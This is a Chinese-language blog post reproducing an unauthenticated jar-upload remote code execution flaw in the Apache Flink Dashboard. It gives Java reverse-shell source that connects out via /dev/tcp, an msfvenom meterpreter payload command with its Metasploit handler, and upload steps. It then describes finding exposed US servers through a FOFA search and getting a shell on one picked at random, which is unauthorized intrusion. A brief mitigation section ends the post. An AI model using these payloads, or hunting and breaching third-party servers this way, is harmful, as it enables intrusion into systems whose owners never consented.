---
title: "Apache Flink任意Jar包上传导致远程代码执行"
date: 2019-11-13T11:57:15+08:00
draft: false
tags: ['远程代码执行漏洞']
categories: ['漏洞复现']
---
看到公众号发了预警,所以就去复现了下

<!--more-->

# 漏洞描述:

2019年11月11号，安全工程师Henry Chen披露了一个Apache Flink未授权上传jar包导致远程代码执行的漏洞。由于Apache Flink Dashboard 默认无需认证即可访问,通过上传恶意jar包并触发恶意代码执行,从而获取shell.

# 影响范围
<= 1.9.1(最新版本)

# 环境搭建:
(1)  提前安装好java(需要java8以上)

![图片](https://ae01.alicdn.com/kf/U67e5dc74affc41079fc778934023c36fO.jpg)

(2)  下载flink-1.9.1

下载地址:[https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz](https://www.apache.org/dyn/closer.lua/flink/flink-1.9.1/flink-1.9.1-bin-scala_2.11.tgz)

(3)  解压下载的压缩包:

```
tar -zxf flink-1.9.1-bin-scala_2.11.tgz
```
(4)  进去到解压后的目录中,来到其bin目录下:

![图片](https://ae01.alicdn.com/kf/U8b11b37eb6234fea8f229c4c0625f5c68.jpg)

(5)   启动flink:
```
./start-cluster.sh
```
(6)  浏览器访问验证(默认端口为8081):

[http://172.26.1.108:8081](http://172.26.1.108:8081)

![图片](https://ae01.alicdn.com/kf/U99519d83a539419fb84879908c4b3c6e2.jpg)

出现上图即搭建成功.

(7)  设置开机自启(这里折腾了好久,一直起不来.直接source /etc/rc.d/rc.local可以启动,但是重启后并不会启动flink,最后在一篇博客中找到了解决方法)

![图片](https://ae01.alicdn.com/kf/U164fe58019ce411f9d20e4ed69d858c2Y.jpg)

开机自启设置参考:[https://www.cnblogs.com/aaronlinux/p/6804531.html](https://www.cnblogs.com/aaronlinux/p/6804531.html)

# 漏洞复现:
## jar包制作步骤:
(1)  参考[https://klionsec.github.io/2016/09/27/revese-shell/#menu](https://klionsec.github.io/2016/09/27/revese-shell/#menu)文中给出的利用java反弹shell

![图片](https://ae01.alicdn.com/kf/U656b35ae92b940418cdd1d7f4649c417T.jpg)

记得修改ip和端口:

![图片](https://ae01.alicdn.com/kf/Udc7af3e8653447ecba8ff75fd58418e3c.jpg)

代码:

```
package shell;
public class Revs {
    /**
    * @param args
    * @throws Exception 
    */
    public static void main(String[] args) throws Exception {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.1.12/9999;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```
(2)  利用eclipse将其导出为一个可执行的jar包:
a. 点击 File-->Export(导出)

![图片](https://ae01.alicdn.com/kf/U71e29ec0fdb9416eb59cd576dcacba1eI.jpg)

b.然后选择java-->Runnable JAR file

![图片](https://ae01.alicdn.com/kf/Ue70247287beb4c4ea36f73fef1c1d1e3O.jpg)

c.然后选择对应的java项目和导出路径以及导出文件名

![图片](https://ae01.alicdn.com/kf/U5573b19b2e4d4fc7a418f6cd5cca80deK.jpg)

这样就生成了一个反弹shell的jar包

## msf生成jar马:
(1)   利用msfvenom来生成一个jar马:
```
msfvenom -p java/meterpreter/reverse_tcp LHOST=172.26.1.156 LPORT=9999 W >text.jar
```
(2)  打开msf的监听模块,并监听9999端口(要与我们jar马设置的端口一致)
```
use exploit/multi/handler
set payload java/meterpreter/reverse_tcp
set LHOST 172.26.1.156
set LPORT 9999
exploit
```
(3)  上传我们生成的jar马并提交后(这部分操作参考下面的复现),可以看到我们成功接收到shell:

![图片](https://ae01.alicdn.com/kf/U338594f3162f4cdb969acb78d45fe4bau.jpg)

## 本地复现:
(1)  访问目标:

![图片](https://ae01.alicdn.com/kf/U8c47f70561ed492583d979eb63200165N.jpg)

(2)  点击Submit New job,打开上传jar包的页面:

![图片](https://ae01.alicdn.com/kf/Ubcff626a9ca144ef83ddfad56485e5116.jpg)

(3)  点击Add New选择我们制作好的jar包:

![图片](https://ae01.alicdn.com/kf/Udc26e0c49a1f485b87a0eae0e88488a8d.jpg)

(4)  我们的机器上监听好端口(我们制作的jar包是直接反弹shell的)
(5)  点击我们刚刚上传的jar包:

![图片](https://ae01.alicdn.com/kf/Ub00fe9f70aeb4b65bd3aeaef3974acf01.jpg)

(6)  然后点击Submit即可,可以看到我们已经成功接收到了shell:

![图片](https://ae01.alicdn.com/kf/Uc38aed7456904c5c9148068ebd4020feV.jpg)

## 互联网站点:
fofa关键词:

"apache-flink-dashboard" && country="US"

![图片](https://ae01.alicdn.com/kf/U441dbddb36db4fee953936554ca4560ej.jpg)

(1)   随便找一个目标:

![图片](https://ae01.alicdn.com/kf/U0c7a43609a9642e5ae9318049d67c166v.jpg)

(2)  点击Submit new Job,可以看到其可以允许我们上传jar包

![图片](https://ae01.alicdn.com/kf/Ud39cf6e68bb04b3980551774c63fa583D.jpg)

(3)  利用flink上传jar包的功能将我们的jar包上传:

![图片](https://ae01.alicdn.com/kf/Ud3a911eaea7d4fb8b3ca8026982f6af5t.jpg)

(4)  上传后,我们在我们的vps上监听好端口
(5)  然后回到浏览器,选中我们刚刚上传的jar包,然后点击Submitting提交,可以看到我们的vps已经成功接收到了shell

![图片](https://ae01.alicdn.com/kf/U75e79141cc714411ae0045990b8f1239y.jpg)

# 漏洞修复:
建议设置防火墙策略，仅允许白名单ip访问 apache flink服务，并在Web代理（如apache httpd）中增加对该服务的digest认证。

时刻关注官网,等待新版本或补丁更新

# 参考链接:
[flink](https://ci.apache.org/projects/flink/flink-docs-release-1.9/getting-started/tutorials/local_setup.html)[安装](https://ci.apache.org/projects/flink/flink-docs-release-1.9/getting-started/tutorials/local_setup.html)

[https://s.tencent.com/research/bsafe/841.html](https://s.tencent.com/research/bsafe/841.html)

[https://mp.weixin.qq.com/s?src=11&timestamp=1573607236&ver=1971&signature=roySoRWnz5MgPLuikntTt3rx7rWFdFBOOQfI5rmaOe-d1LWj7NEJxkVBvzfjKtpuihSaRk*EVBoHJ5Roh48qdTm3v2jbU8EWAVAs8i3ylp3OOskx7IUXnKXqDU5tcUfn&new=1](https://mp.weixin.qq.com/s?src=11&timestamp=1573607236&ver=1971&signature=roySoRWnz5MgPLuikntTt3rx7rWFdFBOOQfI5rmaOe-d1LWj7NEJxkVBvzfjKtpuihSaRk*EVBoHJ5Roh48qdTm3v2jbU8EWAVAs8i3ylp3OOskx7IUXnKXqDU5tcUfn&new=1)

[https://klionsec.github.io/2016/09/27/revese-shell/#menu](https://klionsec.github.io/2016/09/27/revese-shell/#menu)

